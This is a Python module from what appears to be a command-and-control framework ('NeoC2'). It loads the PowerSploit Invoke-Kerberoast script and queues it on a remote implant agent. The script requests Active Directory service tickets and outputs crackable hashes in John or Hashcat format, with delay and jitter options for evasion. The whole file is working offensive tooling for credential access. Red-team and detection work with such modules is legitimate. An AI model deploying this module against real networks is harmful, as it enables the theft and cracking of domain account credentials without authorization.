# modules/Invoke_Kerberoast.py
import os
import importlib.util
import base64
import re

def get_info():
    """Get module information"""
    return {
        "name": "Invoke-Kerberoast",
        "description": "Execute a PowerShell Invoke-Kerberoast script for requesting service tickets for accounts with SPNs set",
        "type": "enumeration",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1558.003",  # Kerberoasting
        "mitre_tactics": ["Credential Access"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run Invoke-Kerberoast on",
                "required": True
            },
            "identity": {
                "description": "A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201). Wildcards accepted.",
                "required": False,
                "default": ""
            },
            "domain": {
                "description": "Specifies the domain to use for the query, defaults to the current domain.",
                "required": False,
                "default": ""
            },
            "ldap_filter": {
                "description": "Specifies an LDAP query string that is used to filter Active Directory objects.",
                "required": False,
                "default": ""
            },
            "search_base": {
                "description": "The LDAP source to search through, e.g. 'LDAP://OU=secret,DC=testlab,DC=local'. Useful for OU queries.",
                "required": False,
                "default": ""
            },
            "server": {
                "description": "Specifies an Active Directory server (domain controller) to bind to.",
                "required": False,
                "default": ""
            },
            "output_format": {
                "description": "Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format. Defaults to 'John'.",
                "required": False,
                "default": "John",
                "choices": ["John", "Hashcat"]
            },
            "delay": {
                "description": "Specifies the delay in seconds between ticket requests.",
                "required": False,
                "default": 0
            },
            "jitter": {
                "description": "Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3",
                "required": False,
                "default": 0.3
            }
        }
    }


def execute(options, session):
    """Execute the Invoke-Kerberoast module with given options and session"""
    agent_id = options.get("agent_id")
    identity = options.get("identity", "")
    domain = options.get("domain", "")
    ldap_filter = options.get("ldap_filter", "")
    search_base = options.get("search_base", "")
    server = options.get("server", "")
    output_format = options.get("output_format", "John")
    delay = options.get("delay", 0)
    jitter = options.get("jitter", 0.3)
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    # Validate output format
    if output_format not in ["John", "Hashcat"]:
        return {
            "success": False,
            "error": f"Invalid output_format: {output_format}. Must be 'John' or 'Hashcat'."
        }
    
    # Validate delay and jitter
    try:
        delay = int(delay)
        jitter = float(jitter)
    except ValueError:
        return {
            "success": False,
            "error": "Delay must be an integer and jitter must be a float."
        }
    
    if jitter < 0 or jitter > 1.0:
        return {
            "success": False,
            "error": "Jitter must be between 0 and 1.0."
        }
    
    # Validate arguments for potential command injection
    # Only allow alphanumeric characters, spaces, and common PowerShell parameter characters
    for arg in [identity, domain, ldap_filter, search_base, server, output_format]:
        if arg and not re.match(r'^[a-zA-Z0-9.\-_=:, \\/"\[\]\(\)@#~]+$', str(arg)):
            return {
                "success": False,
                "error": f"Invalid characters in argument: {arg}. Contains potential injection."
            }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    
    # Read the original Invoke-Kerberoast.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Invoke-Kerberoast.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find Invoke-Kerberoast script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading Invoke-Kerberoast script: {str(e)}"
        }
    
    # Build the execution command with parameters
    cmd_parts = ["Invoke-Kerberoast"]
    
    if identity:
        cmd_parts.append(f"-Identity '{identity}'")
    if domain:
        cmd_parts.append(f"-Domain '{domain}'")
    if ldap_filter:
        cmd_parts.append(f"-LDAPFilter '{ldap_filter}'")
    if search_base:
        cmd_parts.append(f"-SearchBase '{search_base}'")
    if server:
        cmd_parts.append(f"-Server '{server}'")
    if output_format:
        cmd_parts.append(f"-OutputFormat '{output_format}'")
    if delay:
        cmd_parts.append(f"-Delay {delay}")
    if jitter and jitter != 0.3:  # Default jitter is 0.3
        cmd_parts.append(f"-Jitter {jitter}")
    
    execution_command = f"{original_script}\n{ ' '.join(cmd_parts) }"
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id and 'task_id' in task_id:
            return {
                "success": True,
                "output": f"Invoke-Kerberoast task {task_id['task_id']} queued for agent {agent_id}",
                "task_id": task_id['task_id'],
                "function": "Invoke-Kerberoast",
                "arguments": {
                    "identity": identity,
                    "domain": domain,
                    "output_format": output_format,
                    "delay": delay,
                    "jitter": jitter
                }
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }